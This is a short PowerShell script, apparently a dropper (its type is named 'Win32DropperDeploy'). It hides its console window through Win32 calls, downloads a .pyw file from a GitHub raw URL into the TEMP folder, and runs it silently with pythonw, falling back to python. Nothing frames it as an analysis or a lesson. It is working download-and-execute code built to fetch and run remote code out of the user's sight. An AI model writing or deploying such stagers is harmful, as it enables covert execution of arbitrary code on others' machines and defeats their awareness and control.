# Hide window immediately
$code = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
try {
    # Unique name to prevent type redefinition errors
    $win32 = Add-Type -MemberDefinition $code -Name "Win32DropperDeploy" -Namespace Win32 -PassThru
    $consolePtr = $win32::GetConsoleWindow()
    if ($consolePtr -ne [IntPtr]::Zero) {
        $win32::ShowWindow($consolePtr, 0) # 0 = SW_HIDE
    }
} catch {}

# Configuration
$url = "https://raw.githubusercontent.com/y-uusuf/ps_scripts/main/play_audio.pyw"
$tempDir = $env:TEMP
$fileName = "play_audio.pyw" 
$destPath = Join-Path $tempDir $fileName

# Download
try {
    # -ErrorAction Stop ensures we catch issues
    Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
}
catch {
    exit
}

# Execute Silently
try {
    Start-Process "pythonw" -ArgumentList $destPath -WindowStyle Hidden
}
catch {
    Start-Process "python" -ArgumentList $destPath -WindowStyle Hidden
}
